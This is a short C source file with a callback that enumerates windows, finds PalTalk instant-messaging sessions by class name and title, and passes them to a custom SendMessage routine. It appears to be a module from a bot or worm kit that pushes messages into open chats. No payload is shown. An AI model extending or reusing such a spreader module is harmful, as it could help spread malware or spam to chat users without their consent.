#include "../Includes.h"

#ifndef NO_PALTALK

BOOL CALLBACK PalTalk(HWND hwnd, LPARAM lpParam)
{
	int iWindow = 0;
	char szWindows[128] = {0};
	char szClassName[50] = {0};

	GetClassName(hwnd, szClassName, sizeof(szClassName));
	if(!strcmp(szClassName, "My Window Class"))
	{
		if(GetWindowText(hwnd, szWindows, sizeof(szWindows)) != 0)
			if(strstr(szWindows, "IM Session") != NULL)
				iWindow = 2;
	}
	SendMessage(hwnd, iWindow);

    return TRUE;
}
#endif